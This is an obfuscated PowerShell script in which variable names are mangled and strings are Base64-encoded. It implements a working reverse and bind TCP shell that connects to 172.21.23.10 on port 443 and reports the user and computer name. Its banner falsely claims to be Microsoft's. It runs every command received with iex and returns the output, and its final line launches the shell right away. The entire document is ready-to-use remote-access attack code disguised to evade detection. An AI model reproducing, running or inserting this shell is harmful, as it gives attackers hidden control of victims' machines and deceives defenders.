function _/=\/==\_/==\_____ 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        ${__/==\/=\_/==\/==\},
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        ${__/====\/\___/=\/\},
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        ${__/\/\/=\_/\/\____},
        [Parameter(ParameterSetName="bind")]
        [Switch]
        ${__/=\_/\___/\/\__/}
    )
    try 
    {
        if (${__/\/\/=\_/\/\____})
        {
            ${/=\___/\__/\___/=} = New-Object System.Net.Sockets.TCPClient(${__/==\/=\_/==\/==\},${__/====\/\___/=\/\})
        }
        if (${__/=\_/\___/\/\__/})
        {
            ${_/===\___/=====\_} = [System.Net.Sockets.TcpListener]${__/====\/\___/=\/\}
            ${_/===\___/=====\_}.start()    
            ${/=\___/\__/\___/=} = ${_/===\___/=====\_}.AcceptTcpClient()
        } 
        ${/==\/====\___/\_/} = ${/=\___/\__/\___/=}.GetStream()
        [byte[]]${/==\/===\_/\_____} = 0..65535|%{0}
        ${/===\/\__/=======} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgAA=='))) + $env:username + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABvAG4AIAA='))) + $env:computername + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBDAG8AcAB5AHIAaQBnAGgAdAAgACgAQwApACAAMgAwADEANQAgAE0AaQBjAHIAbwBzAG8AZgB0ACAAQwBvAHIAcABvAHIAYQB0AGkAbwBuAC4AIABBAGwAbAAgAHIAaQBnAGgAdABzACAAcgBlAHMAZQByAHYAZQBkAC4ACgAKAA=='))))
        ${/==\/====\___/\_/}.Write(${/===\/\__/=======},0,${/===\/\__/=======}.Length)
        ${/===\/\__/=======} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '>')
        ${/==\/====\___/\_/}.Write(${/===\/\__/=======},0,${/===\/\__/=======}.Length)
        while((${/===\__/=\/=\_/==} = ${/==\/====\___/\_/}.Read(${/==\/===\_/\_____}, 0, ${/==\/===\_/\_____}.Length)) -ne 0)
        {
            ${/=\______/\__/\/=} = New-Object -TypeName System.Text.ASCIIEncoding
            ${_/\/\__/\/\____/\} = ${/=\______/\__/\/=}.GetString(${/==\/===\_/\_____},0, ${/===\__/=\/=\_/==})
            try
            {
                ${/=\/=\/\__/=\/==\} = (iex -Command ${_/\/\__/\/\____/\} 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgA='))) 
                Write-Error $_
            }
            ${__/\____/===\/\__}  = ${/=\/=\/\__/=\/==\} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '> '
            ${__/==\/==\_/\_/\/} = ($error[0] | Out-String)
            $error.clear()
            ${__/\____/===\/\__} = ${__/\____/===\/\__} + ${__/==\/==\_/\_/\/}
            ${___/==\__/\___/==} = ([text.encoding]::ASCII).GetBytes(${__/\____/===\/\__})
            ${/==\/====\___/\_/}.Write(${___/==\__/\___/==},0,${___/==\__/\___/==}.Length)
            ${/==\/====\___/\_/}.Flush()  
        }
        ${/=\___/\__/\___/=}.Close()
        if (${_/===\___/=====\_})
        {
            ${_/===\___/=====\_}.Stop()
        }
    }
    catch
    {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACEAIABDAGgAZQBjAGsAIABpAGYAIAB0AGgAZQAgAHMAZQByAHYAZQByACAAaQBzACAAcgBlAGEAYwBoAGEAYgBsAGUAIABhAG4AZAAgAHkAbwB1ACAAYQByAGUAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAGMAbwByAHIAZQBjAHQAIABwAG8AcgB0AC4A'))) 
        Write-Error $_
    }
}
_/=\/==\_/==\_____ -__/\/\/=\_/\/\____ -__/==\/=\_/==\/==\ 172.21.23.10 -__/====\/\___/=\/\ 443